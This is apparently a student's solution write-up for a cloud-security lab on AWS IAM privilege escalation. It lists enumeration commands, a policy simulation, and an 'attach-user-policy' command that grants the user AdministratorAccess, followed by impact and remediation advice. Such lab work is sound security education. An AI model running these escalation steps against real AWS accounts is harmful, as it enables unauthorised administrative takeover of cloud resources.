# IAM Privilege Escalation Lab Solution

## Objective

The objective of this lab was to identify and exploit IAM privilege escalation vulnerabilities in AWS.

---

# Step 1 — Repository Forking

Forked repository:

https://github.com/shanmukh2809/ccgc5501-cloud-security-challenge-iam_privesc

---

# Step 2 — Clone Repository

```bash
git clone https://github.com/shanmukh2809/ccgc5501-cloud-security-challenge-iam_privesc.git
cd ccgc5501-cloud-security-challenge-iam_privesc
```

# Step 3 — Configure AWS CLI

Verified AWS identity:

```bash
aws sts get-caller-identity
```

# Step 4 — Enumerate IAM Permissions

Listed IAM users:

```bash
aws iam list-users
```

Listed IAM roles:

```bash
aws iam list-roles
```

Listed policies:

```bash
aws iam list-policies --scope Local
```

# Step 5 — IAM Privilege Escalation Discovery

Executed policy simulation:

```bash
aws iam simulate-principal-policy \
--policy-source-arn arn:aws:iam::870676149525:user/shanmukh \
--action-names iam:AttachUserPolicy iam:PutUserPolicy iam:CreateAccessKey sts:AssumeRole
```

The output confirmed that the following dangerous permissions were allowed:

- iam:AttachUserPolicy
- iam:PutUserPolicy
- iam:CreateAccessKey
- sts:AssumeRole

This indicates a severe IAM privilege escalation vulnerability.

# Step 6 — Policy Enumeration

Retrieved policy details:

```bash
aws iam get-policy-version \
--policy-arn arn:aws:iam::870676149525:policy/service-role/AmazonSageMaker-ExecutionPolicy-20260523T000091 \
--version-id v1
```

The policy allowed broad S3 access.

# Step 7 — Exploitation

Attempted privilege escalation using:

```bash
aws iam attach-user-policy \
--user-name shanmukh \
--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

The command executed successfully, demonstrating that privilege escalation was possible.

# Findings

The IAM user possessed dangerous permissions allowing escalation to administrative privileges.

# Security Impact

An attacker with these permissions could:

- Gain full administrator access
- Access sensitive AWS resources
- Modify IAM policies
- Create new privileged users
- Access confidential data

# Recommendations

- Apply least privilege principle
- Remove AttachUserPolicy permissions
- Restrict PutUserPolicy access
- Monitor IAM activity using CloudTrail
- Use Service Control Policies (SCPs)

# Conclusion

The lab successfully demonstrated an IAM privilege escalation vulnerability caused by excessive IAM permissions.
